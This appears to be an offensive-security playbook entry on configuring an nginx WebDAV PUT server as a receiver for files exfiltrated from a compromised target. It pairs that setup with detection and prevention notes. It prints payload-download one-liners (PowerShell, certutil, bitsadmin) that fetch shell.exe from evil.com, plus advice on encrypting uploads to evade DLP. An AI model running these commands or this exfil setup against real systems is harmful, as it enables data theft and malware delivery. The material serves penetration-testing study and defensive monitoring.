sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

sudo systemctl restart nginx.service

examples.label: Debug bind conflict
examples.command:
sudo tail -2 /var/log/nginx/error.log
ss -lnpt | grep 80
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx.service

notes: Troubleshoot: tail -2 /var/log/nginx/error.log ; ss -lnpt | grep 80 ; ps -ef | grep <pid>. nginx WebDAV PUT lets clients upload via curl -T without any Python/Ruby server. Common port conflict: apache2 or Python may already own port 80 — remove default site or use alternate port (9001). The directory must be owned by www-data. Also covered in: CPTS Ch07 (File Transfers).

recommended.note: Target PUTs loot to this receiver.

name: Hosting - Catch Files via Nginx PUT
description: Configure Nginx with WebDAV PUT to reliably receive uploaded files (handles large/binary better than simple servers). Upload with curl -T.

steps.label: 2. Nginx site (upload.conf: listen 9001; location /SecretUploadDirectory/ { root /var/www/uploads; dav_methods PUT; })
steps.command:
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx.service

defense.why_it_works: An attacker configures nginx with WebDAV PUT enabled (dav_methods PUT) on an upload directory to CATCH files uploaded from a compromised host - the receiving end of an exfil/transfer.
defense.prerequisites: An attacker-controlled nginx server with a writable upload location and the target able to reach it.
defense.impact: Provides a reliable endpoint to receive files exfiltrated from the target over HTTP.
defense.detection: On the victim side this looks like an outbound HTTP PUT to an external host - unusual for most processes; egress/DLP monitoring catches the upload; command line of the uploading tool.
defense.artifacts: An outbound HTTP PUT to the attacker nginx; the uploading process's network connection; DLP hits on the content.
defense.prevention: [MITRE T1048 M1037] Egress filtering + DLP on outbound PUT/POST to unknown hosts; restrict which hosts can reach the internet.
defense.evasion: Upload over HTTPS to blend with web traffic; the catch-server is attacker-side, so only the outbound flow is target-visible - encrypt content to defeat DLP.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
defense.code_review:
RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.
  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)
GREP:  grep -rniE "move_uploaded_file|\$_FILES|multer|formidable|MultipartFile|SaveAs\(" .
SAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir.
